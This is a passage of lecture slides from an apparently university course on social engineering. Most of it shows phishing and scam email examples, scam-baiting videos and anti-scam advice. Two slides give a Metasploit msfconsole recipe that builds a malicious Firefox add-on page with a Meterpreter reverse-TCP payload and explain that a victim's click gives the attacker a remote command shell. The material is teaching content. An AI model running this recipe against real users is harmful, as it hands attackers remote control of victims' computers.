+<h2><span class="dada-title-main">My Brothe, Jazz Emu...<span class="dada-font-footnotesize"> </span></span><span class="hfill-right"><span class="dada-font-footnotesize">[</span><a href="https://hugh.myddns.me/media/movies/MyBrothe.mp4">4</a><span class="dada-font-footnotesize">]</span></span></h2>
+<div class="dada-frame-body">
+<div class="dada-font-footnotesize">
+<div class="dada-bubble" style="background-color: rgb(128,255,128); width: 80%; margin-left: 0; margin-right: auto;">
+<p><span><span class="dada-font-footnotesize">Henderson becomes rich?</span></span></p>
+</div>
+</div>
+<div class="center">
+<div class="dada-fbox" style="width: 80%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/MyBrothe.png" style="height: auto; width:100.0%; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+</div>
+<div class="dada-slide-num">18/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Normal mail</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Undisclosed recipients is a clue...</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox">
+<img data-src="../images/BillScam.png" style="width: auto; height:974px; max-width: none; max-height: none" alt="image">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">19/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Google the content</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">First hit is about scams...</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox" style="width: 70.0%">
+<img data-src="../images/BillScam1.png" style="width: 100%; height: auto; max-width: none; max-height: none" alt="image">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">20/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Detail in the mail</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Where did it come from?</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox" style="width: 70.0%">
+<img data-src="../images/BillScam2.png" style="width: 100%; height: auto; max-width: none; max-height: none" alt="image">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">21/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Another normal looking mail</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Click on the link....</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox">
+<img data-src="../images/PhishingMail.png" style="width: auto; height:974px; max-width: none; max-height: none" alt="image">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">22/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Normal looking login</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">I clicked on the link! (Just for you :)</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox" style="width: 70.0%">
+<img data-src="../images/PhishingSite.png" style="width: 100%; height: auto; max-width: none; max-height: none" alt="image">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">23/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Detail in the mail</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Where did it come from?</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox" style="width: 70.0%">
+<img data-src="../images/PhishingMail1.png" style="width: 100%; height: auto; max-width: none; max-height: none" alt="image">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">24/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Detail in the mail</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Why does the link not match the URL?</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox">
+<img data-src="../images/PhishingMail2.png" style="width: auto; height:974px; max-width: none; max-height: none" alt="image">
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">25/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">My brother-in-law messaged me recently</span></h2>
+<div class="dada-frame-body">
+<div class="center">
+<div class="dada-fbox" style="width: 95%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><table><tbody><tr><td style="text-align: center;"><div class="dada-fbox" style="width: 100%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/RonScam.jpg" style="width: auto; height:702px; max-width: none; max-height: none" alt="image"></p></div></div></td><td style="text-align: left; border-left: 1px solid black;"><span class="dada-emph"> </span> <span class="dada-emph"> </span> <span class="dada-emph"> </span> <span class="dada-emph"> </span> <span class="dada-emph"> </span> <span class="dada-emph"><span class="dada-font-footnotesize">Here is a screenshot from my computer,</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">when my brother-in-law chatted to me one day</span></span> <span class="dada-emph">“</span> <span class="dada-emph"><span class="dada-font-footnotesize">out of the blue</span></span> <span class="dada-emph">”</span> <span class="dada-emph"><span class="dada-font-footnotesize">.</span></span> <hr style="border: none; border-top: 3px solid black; width: 40%; margin: 0.4em 0;"> <span class="dada-emph"><span class="dada-font-footnotesize">I kind of knew pretty quickly that it was not him.</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">There were clues...</span></span> <hr style="border: none; border-top: 3px solid black; width: 40%; margin: 0.4em 0;"> <span class="dada-emph"><span class="dada-font-footnotesize">If I had been feeling a bit more aggressive I would have kept him talking to waste his time.</span></span></td></tr></tbody></table></div>
+</div>
+</div>
+<div class="dada-slide-num">26/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Scamming the scammers, James Veitch...<span class="dada-font-footnotesize"> </span></span><span class="hfill-right"><span class="dada-font-footnotesize">[</span><a href="https://hugh.myddns.me/media/movies/JamesVeitch-1.mp4">5</a><span class="dada-font-footnotesize">,</span><a href="https://en.wikipedia.org/wiki/Scam_baiting">i2</a><span class="dada-font-footnotesize">]</span></span></h2>
+<div class="dada-frame-body">
+<div class="dada-font-footnotesize">
+<div class="dada-bubble" style="background-color: rgb(128,255,128); width: 80%; margin-left: 0; margin-right: auto;">
+<p><span><span class="dada-font-footnotesize">Solomon Odonkoh does not become rich.</span></span></p>
+</div>
+</div>
+<div class="center">
+<div class="dada-fbox" style="width: 75%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/JamesVeitch.png" style="height: auto; width:100.0%; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+</div>
+<div class="dada-slide-num">27/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Platform/tool for evaluating penetration-testing: Metasploit<span class="dada-font-footnotesize"> </span></span><span class="hfill-right"><span class="dada-font-footnotesize">[</span><a href="https://hugh.myddns.me/media/movies/metasploitintro-1.mp4">6</a><span class="dada-font-footnotesize">]</span></span></h2>
+<div class="dada-frame-body">
+<div class="center">
+<div class="dada-fbox" style="width: 50%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/metasploit.png" style="height: auto; width:100.0%; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+<div class="block">
+<div class="block-title">Metasploit</div>
+<div class="block-content">
+<p><span class="dada-font-footnotesize">Metasploit enables a collection of exploits - that is,</span><span class="dada-font-footnotesize"> it can generate exploits for you to try out against your systems and applications.</span></p>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">28/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Surface 1 attack, remote login...</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">A recipe...</div>
+<div class="block-content">
+<p><span class="dada-font-footnotesize">Use msf-console to construct an attack:</span></p>
+<div class="center">
+<div class="dada-fbox" style="width: 80%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="dada-lyxcode"><pre><span class="dada-bold"> msfconsole</span>
+<span class="dada-bold"> use exploit/multi/browser/firefox_xpi_bootstrapped_addon </span>
+<span class="dada-bold"> show targets </span>
+<span class="dada-bold"> set target 1 </span>
+<span class="dada-bold"> set srvhost 10.0.2.15</span>
+<span class="dada-bold"> set payload windows/meterpreter/reverse_tcp</span>
+<span class="dada-bold"> set lhost 10.0.2.15</span>
+<span class="dada-bold"> run...</span><span class="dada-bold"> (shows the URL)</span>
+<span class="dada-bold"> sessions -i </span>
+<span class="dada-bold"> sessions -i 1</span></pre></div></div>
+</div>
+<p><span class="dada-font-footnotesize">The command above uses msf-console to construct an addon for the Firefox web browser in a web page.</span><span class="dada-font-footnotesize"> It returns the URL of the webpage.</span><span class="dada-font-footnotesize"> Once the victim clicks on the web page,</span><span class="dada-font-footnotesize"> the payload connects back to the host,</span><span class="dada-font-footnotesize"> allowing the attacker to have CMD prompt access to the victim&#x27;s computer.</span></p>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">29/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Surface 1 attack - persuade them to click...</span></h2>
+<div class="dada-frame-body">
+<div class="center">
+<div class="dada-fbox" style="width: 96%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/win7-6.png" style="width: auto; height:388px; max-width: none; max-height: none" alt="image">   <img class="dada-inline-img" data-src="images/win7-8.png" style="width: auto; height:388px; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+<div class="alertblock">
+<div class="block-title">Firefox attack</div>
+<div class="block-content">
+<p><span class="dada-font-footnotesize">On the left we see Firefox on the victim computer navigating to the malicious URL,</span><span class="dada-font-footnotesize"> and putting up a prompt for the addon.</span><span class="dada-font-footnotesize"> After allowing the installation of the addon,</span><span class="dada-font-footnotesize"> the victim computer returns to normal,</span><span class="dada-font-footnotesize"> but on the attacker machine,</span><span class="dada-font-footnotesize"> we now have a CMD command shell,</span><span class="dada-font-footnotesize"> to inspect and manipulate the remote victim&#x27;s Windows machine.</span></p>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">30/34</div>
+</section>
+<section class="slide level2 dada-beamer-slide dada-outline-slide">
+<div class="dada-topbar">
+<div class="dada-topbar-left"><span class="dada-topbar-current">Social Engineering</span></div>
+<div class="dada-topbar-right"><span class="dada-topbar-subsection-other">Manipulating people</span><span class="dada-topbar-subsection-other">Practical problems: issues in authentication</span><span class="dada-topbar-subsection-other">Emails, emails, emails</span><span class="dada-topbar-subsection-current">Some advice...</span></div>
+</div>
+<h2><span class="dada-title-main">Outline</span></h2>
+<div class="dada-frame-body">
+<div class="dada-toc">
+<div class="dada-toc-grid">
+<div class="dada-toc-sec-cell"><span style="color: blue"><span class="dada-bold">Social Engineering</span></span></div>
+<div class="dada-toc-sub-cell"><ul>
+<li><span style="color: lightgray">Manipulating people</span></li>
+<li><span style="color: lightgray">Practical problems: issues in authentication</span></li>
+<li><span style="color: lightgray">Emails, emails, emails</span></li>
+<li>Some advice...</li>
+</ul></div>
+</div>
+</div>
+</div>
+<div class="dada-bottombar">
+<div class="dada-bottombar-left"><span class="dada-bottombar-text">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</span></div>
+<div class="dada-bottombar-right"><span class="dada-bottombar-text">DADA2026, Social Engineering</span></div>
+</div>
+<img class="dada-logo" src="../images/beamer-nus-logo.png" style="width: 1cm" alt="logo">
+<div class="dada-slide-num">31/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">This NEVER happens<span class="dada-font-footnotesize"> </span></span><span class="hfill-right"><span class="dada-font-footnotesize">[</span><a href="https://hugh.myddns.me/media/movies/SaladuScam.srt.mp4">7</a><span class="dada-font-footnotesize">]</span></span></h2>
+<div class="dada-frame-body">
+<div class="dada-font-footnotesize">
+<div class="dada-bubble" style="background-color: rgb(128,255,128); width: 80%; margin-left: 0; margin-right: auto;">
+<p><span><span class="dada-font-footnotesize">Murray helps Bret and Jemaine with finances.</span></span></p>
+</div>
+</div>
+<div class="center">
+<div class="dada-fbox" style="width: 75%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/BretAndGermaine.png" style="height: auto; width:100.0%; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+</div>
+<div class="dada-slide-num">32/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Some scamming advice...</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Your friend was not mugged in London... and...</div>
+<div class="block-content">
+<ul>
+<li><div class="dada-li-text"><span class="dada-font-footnotesize">Microsoft Security Services is not calling you at home,</span><span class="dada-font-footnotesize"> and they do not know that your computer is infected.</span></div></li>
+<li><div class="dada-li-text"><span class="dada-font-footnotesize">Neither the devout christian widow Mrs Fortunabe of Lagos,</span><span class="dada-font-footnotesize"> nor the wife of the Argentinian minister killed in the plane crash (see link),</span><span class="dada-font-footnotesize"> nor the lawyer acting for the late Dr Eldorado...</span><span class="dada-font-footnotesize"> really wants to be your friend.</span></div></li>
+<li><div class="dada-li-text"><span class="dada-font-footnotesize">The story of the poor crippled boy is heartbreaking.</span><span class="dada-font-footnotesize"> But it is not true.</span></div></li>
+<li><div class="dada-li-text"><span class="dada-font-footnotesize">The beautiful Albanian (woman/man - photo attached) does not like what s/he knows about you,</span><span class="dada-font-footnotesize"> and is not a beautiful Albanian (woman/man).</span></div></li>
+<li><div class="dada-li-text"><span class="dada-font-footnotesize">You have not won </span><span class="dada-font-footnotesize">400,000 in the Euro lottery.</span><span class="dada-font-footnotesize"> Oranges in a paper bag cannot double your money,</span><span class="dada-font-footnotesize"> and there is not a lot of dyed money that needs chemical treatment.</span></div></li>
+<li><div class="dada-li-text"><span class="dada-font-footnotesize">And Nigel Saladu from Nigeria will not repay you.</span></div></li>
+</ul>
+<p><span class="dada-font-footnotesize">Ignore it all...</span></p>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">33/34</div>
+</section>
+<section class="slide level2 dada-beamer-slide">
+<div class="dada-topbar">
+<div class="dada-topbar-left"><span class="dada-topbar-current">Social Engineering</span></div>
+<div class="dada-topbar-right"><span class="dada-topbar-subsection-other">Manipulating people</span><span class="dada-topbar-subsection-other">Practical problems: issues in authentication</span><span class="dada-topbar-subsection-other">Emails, emails, emails</span><span class="dada-topbar-subsection-current">Some advice...</span></div>
+</div>
+<h2><span class="dada-title-main">Summary: Social Engineering</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">In this session we have seen...</div>
+<div class="block-content">
+<p><span style="color: blue"><span class="dada-font-footnotesize">Examples</span></span><span class="dada-font-footnotesize"> - of common social-engineering approaches,</span><span class="dada-font-footnotesize"> hopefully reminding you all that,</span><span class="dada-font-footnotesize"> the next time you read your email,</span><span class="dada-font-footnotesize"> you should be attentive and cautious.</span></p>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<p><span style="color: blue"><span class="dada-font-footnotesize">Password Mechanisms</span></span><span class="dada-font-footnotesize"> - It is surprising how little research is done directly on some of the simple things.</span><span class="dada-font-footnotesize"> In this vein,</span><span class="dada-font-footnotesize"> we saw Anderson&#x27;s research into password choice.</span><span class="dada-font-footnotesize"> We will leave it until later in the course to look into (for example) cryptographic techniques to assist in more secure authentication/login.</span><span class="dada-font-footnotesize"> </span></p>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<p><span style="color: blue"><span class="dada-font-footnotesize">Some tools</span></span><span class="dada-font-footnotesize"> - We briefly looked at how closer examination of our emails can help you protect yourself,</span><span class="dada-font-footnotesize"> and we looked at Metasploit,</span><span class="dada-font-footnotesize"> a platform containing many (1000s) of common tricks used to do social engineering.</span></p>
+</div>
+</div>
+</div>
+<div class="dada-bottombar">
+<div class="dada-bottombar-left"><span class="dada-bottombar-text">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</span></div>
+<div class="dada-bottombar-right"><span class="dada-bottombar-text">DADA2026, Social Engineering</span></div>
+</div>
+<img class="dada-logo" src="../images/beamer-nus-logo.png" style="width: 1cm" alt="logo">
+<div class="dada-slide-num">34/34</div>
+</section>
+</section>
+</div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/reveal.min.js"></script>
+<script>Reveal.initialize({hash: true, width: 1920, height: 1080, margin: 0});</script>
+</body>
+</html>
